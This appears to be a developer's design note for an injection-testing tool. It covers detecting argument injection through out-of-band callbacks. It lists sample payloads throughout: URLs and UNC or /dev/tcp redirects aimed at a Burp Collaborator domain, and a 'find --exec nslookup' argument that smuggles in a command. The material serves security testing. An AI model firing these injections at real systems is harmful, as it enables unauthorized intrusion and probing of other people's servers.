# Detecting argument injection
Apart from differences in application's response, we might dalso detect argument injection by:
- reference injection- we supply an argument that, if interpreted properly, will ensue a network response (e.g. a DNS lookup, HTTP/FTP/SMB interaction etc) - this can be bruteforced
- command injection through the target-specific argument - we supply an arbitrary command into a command-specific flag - which is our "base" command in SHELLING (doing whatever the setting is, e.g. a lookup or sleep/selfping)  - this is rather hardcoded, e.g. "find / -name <INJECTION>" with injection "a --exec nslookup PAYLOAD_MARK.BURP_COLLAB_DOMAIN".



## Reference injection
In the first approach we have no idea what is the target command we are injecting arguments into. The main assumption is that there are only letters, uppercase letters and digits (the last not likely to take any argument values, though) that can represent short flags in formats:

    COMMAND -FLAG
    COMMAND /FLAG

At this point we do not attempt to bruteforce any full names (long versions of the flags), like:

    COMMAND --FULL_FLAGNAME

Good candidates for values are:

    smb://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 
    file://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 
    http://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 
    ftp://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 

Additionally these are worth checking too:

    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a
    > /dev/tcp/wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/80
    
This might as well work with injections like (plus the nix variant from above):

    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a
    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a<NULLBYTE>
    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a<POOTERMINATOR>
    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a::COMMENT OUT

whereas neither command nor argument separators are allowed, but we can redirect the outpt to an arbitrary local file (which might be very good too :D). 



## Command inejction
In this case we check for particular flags in particular binaries (assuming that the matching binary is being executed on the server), e.g. --exec in find, -O in wget or /c in some windows commands.


## Syntax
We should still keep in mind quotes in the final expression syntax might make our payload fail, hence we need to make sure we also create and evaluate proper test cases while developing this feature.

This is all experimental.
